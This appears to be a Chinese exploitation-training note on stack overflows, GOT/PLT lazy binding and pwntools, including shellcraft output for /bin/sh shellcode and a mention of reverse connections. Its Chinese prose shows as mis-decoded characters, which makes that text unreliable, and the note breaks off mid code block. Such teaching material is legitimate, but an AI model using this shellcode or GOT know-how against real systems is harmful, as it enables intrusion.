# åŸºç¡€çŸ¥è¯†

:star:ESPã€EBPè°æ˜¯æ ˆé¡¶è°æ˜¯æ ˆåº•

:star:è¿™ä¸¤ä¸ªæ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œè°ä¼šç»å¸¸æ”¹å˜ï¼Ÿ

:star:ä»–ä¸ºä»€ä¹ˆä¼šç»å¸¸å˜ï¼Ÿä¸ç»å¸¸å˜çš„é‚£ä¸€ä¸ªæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ

:star:callä¸€ä¸ªå‡½æ•°åœ°å€æ—¶å€™å‘ç”Ÿäº†å“ªäº›äº‹æƒ…ï¼Ÿ

:star:main() ---> vuln() ----> gets() ä½ é€šè¿‡getsæº¢å‡ºï¼Œè¦†ç›–çš„æ˜¯è°çš„è¿”å›åœ°å€ï¼Œè¿”å›åˆ°å“ªé‡Œï¼Ÿ

:star:pushå’Œpopç”¨åŸºæœ¬æ±‡ç¼–æŒ‡ä»¤æ€ä¹ˆè§£é‡Šï¼Ÿ

:star:retæŒ‡ä»¤ç”¨åŸºæœ¬æ±‡ç¼–æŒ‡ä»¤æ€ä¹ˆè§£é‡Šï¼Ÿleave retå‘¢ï¼Ÿ

:star:Intelæ±‡ç¼–å’ŒAT&Tæ±‡ç¼–åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ

:star:ç¨‹åºé“¾æ¥libcçš„æœºåˆ¶

ç®€å•æ ˆæº¢å‡ºï¼š

Ubuntu 16/18 ä¸å«æœ‰æ ˆå¯¹é½æœºåˆ¶ï¼Œæ— éœ€å†æ¬¡è°ƒè¯•æ ˆç©ºé—´

å¤§é‡çš„æ ‡å‡†å‡½æ•°/å¸¸ç”¨å‡½æ•° --- ã€‹åº“å‡½æ•° --- > å°†æ ‡å‡†å‡½æ•°ä¸å°è£…åœ¨ç¨‹åºé‡Œï¼Œé™ä½ç¨‹åºä½“ç§¯

å¦‚ä½•ä¿®æ”¹ç¨‹åºé“¾æ¥çš„libc

```
ldd pwn
```

# 3-got-plt

è¦è¯´è¿™ä¸ªï¼Œå°±è¦æåˆ° Linuxçš„åŠ¨æ€é“¾æ¥äº†ã€‚

## 3.1-LinuxåŠ¨æ€é“¾æ¥

ç”¨äººè¯è¯´ä¸€ä¸‹å°±æ˜¯ï¼š

> in
> é™æ€é“¾æ¥å°±æ˜¯ï¼Œç›´æ¥ä»åº“é‡Œé¢æŠŠå‡½æ•°æ‰’å‡ºæ¥ï¼ŒåŠ åˆ°ä»£ç é‡Œè¿›è¡Œç¼–è¯‘ã€‚
> åŠ¨æ€é“¾æ¥ä¸åŒï¼Œä»–åªç”¨ä¸€äº›ç¬¦å·ä»£æ›¿å‡½æ•°ï¼Œå½“éœ€è¦è°ƒç”¨ä»–çš„æ—¶å€™ï¼Œä»–å†å»åº“é‡Œé¢ç°æ‰¾ã€‚

è¿˜ä¸ç†è§£ï¼ŸğŸ‘´ç»™ä½ å°åˆ€æ‹‰å±è‚¡ï¼ˆå¼€å¼€çœ¼ï¼š

> çœ‹ç€è¿™å¼ å›¾ï¼Œè¿™å«é™æ€é“¾æ¥ï¼š
> [![god](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)
> å†çœ‹è¿™å¼ å›¾ï¼Œè¿™å°±å«åŠ¨æ€é“¾æ¥ï¼š
> [å›¾ç‰‡](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)

## 3.2-PLT&GOT

linuxä¸‹çš„åŠ¨æ€é“¾æ¥æ˜¯é€šè¿‡PLT&GOTæ¥å®ç°çš„ï¼Œè¿™é‡Œåšä¸€ä¸ªå®éªŒï¼Œé€šè¿‡è¿™ä¸ªå®éªŒæ¥ç†è§£ï¼š
ä½¿ç”¨å¦‚ä¸‹æºä»£ç  test.cï¼š

```
C
#include <stdio.h>
void print_banner()
{
    printf("Shangu is very handsome!\n");
}
int main(void)
{
    print_banner();
    return 0;
}
```

ä¾æ¬¡ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š

```
BASH
gcc -no-pie -Wall -g -o test.o -c test.c -m32
gcc -no-pie -o test test.o -m32
```

å‚æ•°è¯¦è§£ï¼š

> **-c**ï¼šåªæ¿€æ´»é¢„å¤„ç†,ç¼–è¯‘,å’Œæ±‡ç¼–,ä¹Ÿå°±æ˜¯ä»–åªæŠŠç¨‹åºåšæˆobjæ–‡ä»¶
> **-o**ï¼šåˆ¶å®šç›®æ ‡åç§°, é»˜è®¤çš„æ—¶å€™, gcc ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶æ˜¯ a.out, å¾ˆéš¾å¬, æ”¹æ‰å®ƒ, å“ˆå“ˆã€‚
> **-g**ï¼šåªæ˜¯ç¼–è¯‘å™¨ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œäº§ç”Ÿè°ƒè¯•ä¿¡æ¯ã€‚
> **-Wall**ï¼šç”Ÿæˆæ‰€æœ‰è­¦å‘Šä¿¡æ¯ã€‚
> **-no-pie**: å…³é—­ PIE æ–¹ä¾¿æˆ‘ä»¬è°ƒè¯•ï¼Œè¦ä¸ç„¶å‡ºæ¥åæ±‡ç¼–å…¨æ˜¯ä¸‹å›¾è¿™æ ·çš„ å¯„å­˜å™¨è€Œä¸æ˜¯å…·ä½“åœ°å€
> **-M intel**ï¼šè¿™æ˜¯ objdump çš„å‚æ•°ï¼Œä¹Ÿå†™åœ¨è¿™é‡Œã€‚chumenğŸ‘´è¯´è¦çœ‹intelé£æ ¼çš„æ±‡ç¼–ï¼Œå¦ä¸€ä¸ªé£ æ ¼å°±æ˜¯ä¸‹å›¾é‚£äº›ï¼Œå¯„å­˜å™¨å‰é¢ä¼šåŠ  % ç­‰ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ã€‚

é€šè¿‡ `objdump -d test.o` å¯ä»¥æŸ¥çœ‹åæ±‡ç¼–ï¼š[![image-20211006212101180](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/92965_image-20211006212101180.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/92965_image-20211006212101180.png)

printf() å’Œå‡½æ•°æ˜¯åœ¨ glibc åŠ¨æ€åº“é‡Œé¢çš„ï¼Œåªæœ‰å½“ç¨‹åºè¿è¡Œèµ·æ¥çš„æ—¶å€™æ‰èƒ½ç¡®å®šåœ°å€ï¼Œæ‰€ä»¥æ­¤æ—¶çš„ printf() å‡½æ•°å…ˆç”¨ `fc ff ff ff` ä¹Ÿå°±æ˜¯æœ‰ç¬¦å·æ•°çš„ `-4` ä»£æ›¿ã€‚

è¿è¡Œæ—¶è¿›è¡Œé‡å®šä½æ˜¯æ— æ³•ä¿®æ”¹ä»£ç æ®µçš„ï¼Œåªèƒ½å°† printf é‡å®šä½åˆ°æ•°æ®æ®µã€‚
é‚£ä¹ˆæ˜¯æ€ä¹ˆæ‰¾åˆ°çœŸæ˜¯åœ°å€çš„å‘¢ï¼Ÿ
å·²ç»ç¼–è¯‘å¥½çš„ç¨‹åºï¼Œè°ƒç”¨ `printf` çš„æ—¶å€™ï¼Œé“¾æ¥å™¨ä¼šé¢å¤–ç”Ÿæˆä¸€å°æ®µä»£ç ï¼Œé€šè¿‡è¿™æ®µä»£ç æ¥è·å– printf() çš„åœ°å€ï¼Œåƒä¸‹é¢è¿™æ ·ï¼Œè¿›è¡Œé“¾æ¥çš„æ—¶å€™åªéœ€è¦å¯¹`printf_stub()` è¿›è¡Œé‡å®šä½æ“ä½œå°±å¯ä»¥ã€‚

```
CODE
.text
...

// è°ƒç”¨printfçš„callæŒ‡ä»¤
call printf_stub
...
printf_stub:
    mov rax, [printfå‡½æ•°çš„å‚¨å­˜åœ°å€] // è·å–printfé‡å®šä½ä¹‹åçš„åœ°å€
    jmp rax // è·³è¿‡å»æ‰§è¡Œprintfå‡½æ•°

.data
...
printfå‡½æ•°çš„å‚¨å­˜åœ°å€,è¿™é‡Œå‚¨å­˜printfå‡½æ•°é‡å®šä½åçš„åœ°å€
```

æ€»ç»“ä¸€ä¸‹ï¼šåŠ¨æ€é“¾æ¥æ¯ä¸ªå‡½æ•°éœ€è¦ä¸¤ä¸ªä¸œè¥¿ï¼š

> **1ã€ç”¨æ¥å­˜æ”¾å¤–éƒ¨å‡½æ•°åœ°å€çš„æ•°æ®æ®µ**
> **2ã€ç”¨æ¥è·å–æ•°æ®æ®µè®°å½•çš„å¤–éƒ¨å‡½æ•°åœ°å€çš„ä»£ç **

åˆšå¥½æœ‰ä¸¤ä¸ªè¡¨å®ç°äº†è¿™ä¸¤ä¸ªè¦æ±‚ï¼Œå°±æ˜¯æˆ‘ä»¬æä¸æ‡‚çš„ `got` å’Œ `plt`ï¼š

å­˜æ”¾å¤–éƒ¨çš„å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ç§°ä¸º**å…¨å±€åç§»è¡¨**ï¼ˆ**GOT**, Global Offset Tableï¼‰ï¼Œ
å­˜æ”¾é¢å¤–ä»£ç çš„è¡¨ç§°ä¸º**ç¨‹åºé“¾æ¥è¡¨**ï¼ˆ**PLT**ï¼ŒProcedure Link Tableï¼‰

### è®²äººè¯ç¯èŠ‚ï¼š

ç¼–è¯‘å¥½çš„ç¨‹åºé‡Œé¢å¹¶æ²¡æœ‰ `printf` çš„ä»£ç ï¼Œéœ€è¦å»å¤–éƒ¨æ‰¾ã€‚ä½†æ˜¯åŠ¨æ€é“¾æ¥æ˜¯ä¸èƒ½æå‰çŸ¥é“çœŸå®åœ°å€çš„ã€‚ç„¶åé“¾æ¥å™¨ä¼šç”Ÿæˆä¸€æ®µä»£ç ç”¨æ¥è·å– `printf` çš„åœ°å€ã€‚è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå°±éœ€è¦ä¸€ä¸ªå­˜å‚¨è¿™äº›å¯»å€ä»£ç çš„æ•°æ®è¡¨ï¼Œè¿˜éœ€è¦ä¸€ä¸ªå­˜å‚¨ç€æ‰€æœ‰å¤–ç½®å‡½æ•°åœ°å€çš„è¡¨ã€‚ä»–ä»¬åˆ†åˆ«æ˜¯ `PLT` å’Œ `GOT`ã€‚

> [![gggggg](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/34547_gggggg.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/34547_gggggg.jpeg)å¯æ‰§è¡Œæ–‡ä»¶é‡Œé¢ä¿å­˜çš„æ˜¯ PLT è¡¨çš„åœ°å€ï¼Œå¯¹åº” PLT åœ°å€æŒ‡å‘çš„æ˜¯ GOT çš„åœ°å€ï¼ŒGOT è¡¨æŒ‡å‘çš„å°±æ˜¯ glibc ä¸­çš„åœ°å€

é‚£æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨è¿™é‡Œé¢æƒ³è¦é€šè¿‡ plt è¡¨è·å–å‡½æ•°çš„åœ°å€ï¼Œé¦–å…ˆè¦ä¿è¯ got è¡¨å·²ç»è·å–äº†æ­£ç¡®çš„åœ°å€ï¼Œä½†æ˜¯åœ¨ä¸€å¼€å§‹å°±è¿›è¡Œæ‰€æœ‰å‡½æ•°çš„é‡å®šä½æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œä¸ºæ­¤ï¼Œlinux å¼•å…¥äº†å»¶è¿Ÿç»‘å®šæœºåˆ¶

## 3.3-å»¶è¿Ÿç»‘å®š

åªæœ‰åŠ¨æ€åº“å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œæ‰ä¼šåœ°å€è§£æå’Œé‡å®šä½å·¥ä½œï¼Œä¸ºæ­¤å¯ä»¥ä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„ä»£ç æ¥å®ç°ï¼š

```
CODE
//ä¸€å¼€å§‹æ²¡æœ‰é‡å®šä½çš„æ—¶å€™å°† printf@got å¡«æˆ lookup_printf çš„åœ°å€
void printf@plt()
{
address_good:
    jmp *printf@got        //è¿™å¥ä»£ç åªæœ‰åœ¨è°ƒç”¨åˆ°è¯¥å‡½æ•°æ‰ä¼šæ‰§è¡Œï¼Œåˆå§‹åŒ–æ—¶å€™æ‰§è¡Œçš„ä¸‹ä¸€å¥
 	jmp lookup_printf      //é¦–å…ˆè·³è½¬åˆ°æŸ¥æ‰¾åœ°å€çš„åœ°æ–¹ï¼Œéœ€è¦ä»–çš„æ—¶å€™åœ¨æ‰§è¡Œä¸Šä¸€æ¡
lookup_printf:
    è°ƒç”¨é‡å®šä½å‡½æ•°æŸ¥æ‰¾ printf åœ°å€ï¼Œå¹¶å†™åˆ° printf@got
	goto address_good;//å†è¿”å›å»æ‰§è¡Œaddress_good
}
```

è¯´æ˜ä¸€ä¸‹è¿™æ®µä»£ç å·¥ä½œæµç¨‹ï¼Œä¸€å¼€å§‹ï¼Œprintf@got æ˜¯ lookup_printf å‡½æ•°çš„åœ°å€ï¼Œè¿™ä¸ªå‡½æ•°ç”¨æ¥å¯»æ‰¾ printf() çš„åœ°å€ï¼Œç„¶åå†™å…¥ printf@gotï¼Œlookup_printf æ‰§è¡Œå®Œæˆåä¼šè¿”å›åˆ° address_goodï¼Œè¿™æ ·å† jmp çš„è¯å°±å¯ä»¥ç›´æ¥è·³åˆ°printf æ¥æ‰§è¡Œäº†

### è®²äººè¯ç¯èŠ‚

> ä¸ºäº†èŠ‚çœèµ„æºï¼Œä¸€å¼€å§‹æ˜¯ä¸è¿›è¡Œé‡å®šå‘çš„ï¼Œå¤ªå¤šå‡½æ•°å¤ªéº»çƒ¦ã€‚è€Œæ˜¯æ‰§è¡Œä¸Šè¿°å‡½æ•°ä¸­çš„ `lookup_printf`å…ˆæŸ¥æ‰¾åˆ° `printf` çš„åœ°å€ï¼Œç„¶åå†™å…¥åˆ° `*printf@got` ã€‚å½“ç¨‹åºæ‰§è¡Œåˆ°éœ€è¦ç”¨ `printf` å‡½æ•°çš„æ—¶å€™ï¼Œæ‰å›å»æ‰§è¡Œ`jmp *printf@got` ã€‚è¿™æ ·è®¾è®¡èƒ½èŠ‚çœèµ„æº
>
> å¦‚æœä¸çŸ¥é“ printf çš„åœ°å€ï¼Œå°±å»æ‰¾ä¸€ä¸‹ï¼ŒçŸ¥é“çš„è¯å°±ç›´æ¥å» jmp æ‰§è¡Œ printf äº†

### â€œ æ‰¾ â€ åœ°å€çš„å®ç°åŸç†

é€šè¿‡ `objdump -M intel -d test > test.asm` å¯ä»¥çœ‹åˆ°å…¶ä¸­ plt è¡¨é¡¹æœ‰ä¸‰æ¡æŒ‡ä»¤ï¼š

```
CODE
080482d0 <.plt>:
 80482d0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80482d6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80482dc:	00 00                	add    BYTE PTR [eax],al
	...

080482e0 <puts@plt>:
 80482e0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80482e6:	68 00 00 00 00       	push   0x0
 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 <.plt>

080482f0 <__libc_start_main@plt>:
 80482f0:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 80482f6:	68 08 00 00 00       	push   0x8
 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 <.plt>
```

å…¶ä¸­é™¤ç¬¬ä¸€ä¸ªè¡¨é¡¹ä»¥å¤–ï¼Œplt è¡¨çš„ç¬¬ä¸€æ¡éƒ½æ˜¯è·³è½¬åˆ°å¯¹åº”çš„ got è¡¨é¡¹ï¼Œè€Œ got è¡¨é¡¹çš„å†…å®¹æˆ‘ä»¬å¯ä»¥é€šè¿‡ gdb æ¥çœ‹ä¸€ä¸‹ï¼Œå¦‚æœå‡½æ•°è¿˜æ²¡æœ‰æ‰§è¡Œçš„æ—¶å€™ï¼Œè¿™é‡Œçš„åœ°å€æ˜¯å¯¹åº” plt è¡¨é¡¹çš„ä¸‹ä¸€æ¡å‘½ä»¤ï¼Œå³ push 0x0

æˆ‘ä»¬æ¥è°ƒè¯•çœ‹ä¸€ä¸‹è¿™äº›åœ°å€é‡Œé¢éƒ½å­˜çš„å•¥ï¼š
å…ˆ `gdb test` ç„¶å `b main`ï¼Œå† `run`ï¼Œ å† `x/x jmpçš„é‚£ä¸ªåœ°å€` å°±å¯ä»¥çœ‹äº†

[![image-20211006233214785](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/10966_image-20211006233214785.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/10966_image-20211006233214785.png)

å¾ˆæ˜æ˜¾äº†ï¼Œé¦–å…ˆè·³åˆ° got åœ°å€ï¼Œgotåœ°å€ä¸­å­˜å‚¨ç€ï¼Œå…¬å…±pltåœ°å€ï¼Œå…¬å…±pltè·³è½¬åˆ° lookupåŠŸèƒ½çš„åœ°å€ã€‚
Look up å®ç°çš„ä»£ç ï¼š

```
CODE
80482e6: push   0x0            //å°†æ•°æ®å‹åˆ°æ ˆä¸Šï¼Œä½œä¸ºå°†è¦æ‰§è¡Œçš„å‡½æ•°çš„å‚æ•°
80482eb: jmp    80482d0 <.plt> //å»åˆ°äº†å…¬å…±pltè¡¨
```

ç„¶åå°±æ˜¯ç¬¬ä¸€ä¸ªpltè¡¨é¡¹çš„å†…å®¹ï¼š

```
CODE
080482d0 <.plt>:
push   DWORD PTR ds:0x804a004  //å°†æ•°æ®å‹åˆ°æ ˆä¸Šï¼Œä½œä¸ºåé¢å‡½æ•°çš„å‚æ•°
jmp    DWORD PTR ds:0x804a008  //è·³è½¬åˆ°å‡½æ•°
add    BYTE PTR [eax],al
```

è·³è½¬è¿‡å»çš„åœ°å€æ˜¯ï¼š

[![image-20211006233854266](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/77692_image-20211006233854266.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/77692_image-20211006233854266.png)

`_dl_runtime_resolve`çš„ä½œç”¨å°±æ˜¯æŸ¥æ‰¾ `printf` çš„åœ°å€ã€‚

## 3.4-æ€»ç»“andç–‘é—®

ç¨‹åºå¦‚æœè°ƒç”¨çš„å‡½æ•°æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦è°ƒç”¨ä»–ï¼Œå°±è¦ç»è¿‡è¿™å‡ æ­¥ï¼š

> xxx@plt -> xxx@got -> xxx@pl -> å…¬å…±@plt -> _dl_runtime_resolve

**é‚£ä¹ˆé—®é¢˜ä¹Ÿå°±æ¥äº†**ï¼š

1. _dl_runtime_resolve æ˜¯æ€ä¹ˆçŸ¥é“è¦æŸ¥æ‰¾ printf å‡½æ•°çš„
2. _dl_runtime_resolve æ‰¾åˆ° printf å‡½æ•°åœ°å€ä¹‹åï¼Œå®ƒæ€ä¹ˆçŸ¥é“å›å¡«åˆ°å“ªä¸ª GOT è¡¨é¡¹

### Answer-1ï¼š

> åœ¨ xxx@plt ä¸­ï¼Œæˆ‘ä»¬åœ¨ jmp ä¹‹å‰ push äº†ä¸€ä¸ªå‚æ•°ï¼Œæ¯ä¸ª xxx@plt çš„ push çš„æ“ä½œæ•°éƒ½ä¸ä¸€æ ·ï¼Œé‚£ä¸ªå‚æ•°å°±ç›¸å½“äºå‡½æ•°çš„ idï¼Œå‘Šè¯‰äº† _dl_runtime_resolve è¦å»æ‰¾å“ªä¸€ä¸ªå‡½æ•°çš„åœ°å€
>
> åœ¨ elf æ–‡ä»¶ä¸­ .rel.plt ä¿å­˜äº†é‡å®šä½è¡¨çš„ä¿¡æ¯ï¼Œä½¿ç”¨ `readelf -r test` å‘½ä»¤å¯ä»¥æŸ¥çœ‹ test å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„é‡å®šä½ä¿¡æ¯
> [![image-20211006234456442](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/89063_image-20211006234456442.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/89063_image-20211006234456442.png)
> æˆ‘ç›´æ¥ä»å¤§ä½¬åšå®¢æ‰¾äº†ä¸ªä¸­æ–‡ç‰ˆç•Œé¢ï¼Œå¯¹ç€çœ‹ä¸€ä¸‹ï¼š
> [![zwb](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/21123_zwb.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/21123_zwb.png)

çœ‹å¤§ä½¬åšå®¢è¯´çš„æ˜¯ï¼Œpushè¿›å»çš„æ“ä½œæ•°æ˜¯å’Œè¿™ä¸ªåç§»é‡ç›¸åŒçš„ã€‚
ä½†æ˜¯æˆ‘å®è°ƒç»“æœå´æ˜¯ä¸ä¸€æ ·çš„ã€‚
è¿™ä¸ªé—®é¢˜ç•™ç€ä»¥åç ”ç©¶ã€‚

### Answer-2ï¼š

çœ‹ .rel.plt çš„ä½ç½®å°±å¯¹åº”ç€ xxx@plt é‡Œ jmp çš„åœ°å€

> åœ¨ i386 æ¶æ„ä¸‹ï¼Œé™¤äº†æ¯ä¸ªå‡½æ•°å ç”¨ä¸€ä¸ª GOT è¡¨é¡¹å¤–ï¼ŒGOT è¡¨é¡¹è¿˜ä¿ç•™äº†ï¼“ä¸ªå…¬å…±è¡¨é¡¹ï¼Œä¹Ÿå³ got çš„å‰ï¼“é¡¹ï¼Œåˆ†åˆ«ä¿å­˜ï¼š
> **got [0]: æœ¬ ELF åŠ¨æ€æ®µ (.dynamic æ®µï¼‰çš„è£…è½½åœ°å€**
> **got [1]ï¼šæœ¬ ELF çš„ link_map æ•°æ®ç»“æ„æè¿°ç¬¦åœ°å€**
> **got [2]ï¼š_dl_runtime_resolve å‡½æ•°çš„åœ°å€**
> åŠ¨æ€é“¾æ¥å™¨åœ¨åŠ è½½å®Œ ELF ä¹‹åï¼Œéƒ½ä¼šå°†è¿™ï¼“åœ°å€å†™åˆ° GOT è¡¨çš„å‰ï¼“é¡¹

## 3.5-å®Œæ•´æµç¨‹æ€»ç»“

ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼š
[![got1](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/67421_got1.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/67421_got1.jpeg)

ç¬¬äºŒæ¬¡è°ƒç”¨ï¼š

[![got2](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/21192_got2.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/21192_got2.jpeg)

# 4-pwntools

## 4.1-pwntoolså¸¸ç”¨æ¨¡å—ï¼š

> - asm : æ±‡ç¼–ä¸åæ±‡ç¼–ï¼Œæ”¯æŒx86/x64/arm/mips/powerpcç­‰åŸºæœ¬ä¸Šæ‰€æœ‰çš„ä¸»æµå¹³å°
> - dynelf : ç”¨äºè¿œç¨‹ç¬¦å·æ³„æ¼ï¼Œéœ€è¦æä¾›leakæ–¹æ³•
> - elf : å¯¹elfæ–‡ä»¶è¿›è¡Œæ“ä½œ
> - gdb : é…åˆgdbè¿›è¡Œè°ƒè¯•
> - memleak : ç”¨äºå†…å­˜æ³„æ¼
> - shellcraft : shellcodeçš„ç”Ÿæˆå™¨
> - tubes : åŒ…æ‹¬tubes.sock, tubes.process, tubes.ssh, tubes.serialtubeï¼Œåˆ†åˆ«é€‚ç”¨äºä¸åŒåœºæ™¯çš„PIPE
> - utils : ä¸€äº›å®ç”¨çš„å°åŠŸèƒ½ï¼Œä¾‹å¦‚CRCè®¡ç®—ï¼Œcyclic patternç­‰

é™¤äº†æˆ‘ä»¬å¸¸ç”¨çš„äº¤äº’æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨listenæ¥å¼€å¯ä¸€ä¸ªæœ¬åœ°çš„ç›‘å¬ç«¯å£ï¼š

```
PYTHON
l = listen()
r = remote('localhost', l.lport)
c = l.wait_for_connection()
r.send('hello')
c.recv()
'hello'
```

## 4.2-äº¤äº’å‡½æ•°ï¼š

> - interactive() : ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨
> - recv(numb=4096, timeout=default) : æ¥æ”¶æŒ‡å®šå­—èŠ‚
> - recvall() : ä¸€ç›´æ¥æ”¶ç›´åˆ°EOF
> - recvline(keepends=True) : æ¥æ”¶ä¸€è¡Œï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\n
> - recvuntil(delims, drop=False) : ä¸€ç›´è¯»åˆ°delimsçš„patternå‡ºç°ä¸ºæ­¢
> - recvrepeat(timeout=default) : æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeout
> - send(data) : å‘é€æ•°æ®
> - sendline(data) : å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æ•°æ®æœ«å°¾åŠ \n

## 4.3-æ±‡ç¼–åæ±‡ç¼–

ä½¿ç”¨asmæ¥è¿›è¡Œæ±‡ç¼–:

```
PYTHON
>>> asm('nop')
'\x90'
>>> asm('nop', arch='arm')
'\x00\xf0 \xe3'
```

æ³¨æ„ï¼Œasméœ€è¦binutilsä¸­çš„aså·¥å…·è¾…åŠ©ï¼Œå¦‚æœæ˜¯ä¸åŒäºæœ¬æœºå¹³å°çš„å…¶ä»–å¹³å°çš„æ±‡ç¼–ï¼Œä¾‹å¦‚åœ¨æˆ‘çš„x86æœºå™¨ä¸Šè¿›è¡Œmipsçš„æ±‡ç¼–å°±ä¼šå‡ºç°aså·¥å…·æœªæ‰¾åˆ°çš„æƒ…å†µï¼Œè¿™æ—¶å€™éœ€è¦å®‰è£…å…¶ä»–å¹³å°çš„cross-binutilsã€‚
å¯ä»¥ä½¿ç”¨contextæ¥æŒ‡å®šcpuç±»å‹ä»¥åŠæ“ä½œç³»ç»Ÿï¼š

```
PYTHON
context(os='linux',arch='i386',endian='little',word_size='32',log_level='debug')
```

ä½¿ç”¨disasmè¿›è¡Œåæ±‡ç¼–:

```
PYTHON
>>> print disasm('6a0258cd80ebf9'.decode('hex'))
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```

## 4.4-Shellcodeç”Ÿæˆå™¨

ä½¿ç”¨ shellcraft å¯ä»¥ç”Ÿæˆå¯¹åº”çš„æ¶æ„çš„shellcodeä»£ç ï¼Œç›´æ¥ä½¿ç”¨é“¾å¼è°ƒç”¨çš„æ–¹æ³•å°±å¯ä»¥å¾—åˆ°

```
PYTHON
>>> print shellcraft.i386.nop().strip('\n')
    nop
>>> print shellcraft.i386.linux.sh()
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
```

å¦‚ä¸Šæ‰€ç¤ºï¼Œå¦‚æœéœ€è¦åœ¨64ä½çš„Linuxä¸Šæ‰§è¡Œ`/bin/sh`å°±å¯ä»¥ä½¿ç”¨`shellcraft.amd64.linux.sh()`ï¼Œé…åˆasmå‡½æ•°å°±èƒ½å¤Ÿå¾—åˆ°æœ€ç»ˆçš„pyaloadäº†ã€‚

é™¤äº†ç›´æ¥æ‰§è¡Œshä¹‹å¤–ï¼Œè¿˜å¯ä»¥è¿›è¡Œå…¶å®ƒçš„ä¸€äº›å¸¸ç”¨æ“ä½œä¾‹å¦‚ææƒã€åå‘è¿æ¥ç­‰ç­‰ã€‚

## 4.5-ELFæ–‡ä»¶æ“ä½œ

> - asm(address, assembly) : åœ¨æŒ‡å®šåœ°å€è¿›è¡Œæ±‡ç¼–
> - bss(offset) : è¿”å›bssæ®µçš„ä½ç½®ï¼Œoffsetæ˜¯åç§»å€¼
> - checksec() : å¯¹elfè¿›è¡Œä¸€äº›å®‰å…¨ä¿æŠ¤æ£€æŸ¥ï¼Œä¾‹å¦‚NX, PIEç­‰ã€‚
> - disasm(address, n_bytes) : åœ¨æŒ‡å®šä½ç½®è¿›è¡Œn_bytesä¸ªå­—èŠ‚çš„åæ±‡ç¼–
> - offset_to_vaddr(offset) : å°†æ–‡ä»¶ä¸­çš„åç§»offsetè½¬æ¢æˆè™šæ‹Ÿåœ°å€VMA
> - vaddr_to_offset(address) : ä¸ä¸Šé¢çš„å‡½æ•°ä½œç”¨ç›¸å
> - read(address, count) : åœ¨address(VMA)ä½ç½®è¯»å–countä¸ªå­—èŠ‚
> - write(address, data) : åœ¨address(VMA)ä½ç½®å†™å…¥data
> - section(name) : dumpå‡ºæŒ‡å®šsectionçš„æ•°æ®

elfæ¨¡å—æä¾›äº†ä¸€ç§ä¾¿æ·çš„æ–¹æ³•èƒ½å¤Ÿè¿…é€Ÿçš„å¾—åˆ°æ–‡ä»¶å†…å‡½æ•°çš„åœ°å€ï¼Œpltä½ç½®ä»¥åŠgotè¡¨çš„ä½ç½®ã€‚

```
PYTHON
elf = ELF('/bin/cat')
print hex(elf.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€
print hex(elf.symbols['write']) # å‡½æ•°åœ°å€
print hex(elf.got['write']) # GOTè¡¨çš„åœ°å€
print hex(elf.plt['write']) # PLTçš„åœ°å€
```

ç”šè‡³å¯ä»¥ä¿®æ”¹ä¸€ä¸ªELFçš„ä»£ç 

```
PYTHON
elf = ELF('/bin/cat')
elf.read(elf.address+1, 3)
